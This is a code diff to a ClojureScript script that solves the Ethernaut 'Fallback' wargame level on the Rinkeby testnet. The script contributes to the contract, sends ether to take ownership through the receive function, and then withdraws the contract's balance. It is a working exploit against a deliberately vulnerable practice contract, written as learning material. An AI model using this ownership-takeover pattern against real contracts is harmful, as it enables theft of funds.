@@ -7,7 +7,9 @@
 ;; FALLBACK
 
 ;; Get the rinkeby address from ethernaut.openzeppelin.com
-(def fallback-addr "0x907910c5ece2284ad3bdd7d18fe7b014357445b0")
+(def fallback-addr "0x13Ed5A695ae7fA5c7B2050dAde02A99089144046")
+
+
 
 (def fallback (u/get-contract!
                fallback-addr
@@ -20,7 +22,7 @@
   (js-obj "gasLimit"
           2000000
           "value"
-          (u/str->wei "0.0009")))
+          (u/eth-str->wei "0.0009")))
 
 ;; receive condition:
 ;; require(msg.value > 0 && contributions[msg.sender] > 0);
@@ -28,25 +30,26 @@
   (js-obj "to"
           fallback-addr
           "value"
-          (u/str->wei "0.2")
+          (u/eth-str->wei "0.2")
           "gasLimit"
           80000))
 
 
-(-> (.contribute fallback contribute-data)
+(comment
 
-    ;; wait for 3 * 13 seconds (average block time)
-    ;; for the `contribute` txn to be included
-    (.then #(js/Promise. (fn [res]
-                           (js/setTimeout res 39000))))
+  (-> (.contribute fallback contribute-data)
 
-    (.then #(.sendTransaction w/rinkeby-wallet
-                              txn-data))
+      ;; wait for 6 confirmations
+      (.then #(.wait % 6))
 
-    ;; wait for 6 confirmations
-    (.then #(.wait % 6))
+      (.then #(.sendTransaction w/rinkeby-wallet
+                                txn-data))
 
-    (.then #(.withdraw fallback))
+      ;; wait for 6 confirmations
+      (.then #(.wait % 6))
 
-    (.then #(.log js/console %))
-    (.catch #(.log js/console %)))
+      (.then #(.withdraw fallback))
+
+      (.then #(.log js/console %))
+      (.catch #(.log js/console %)))
+  )
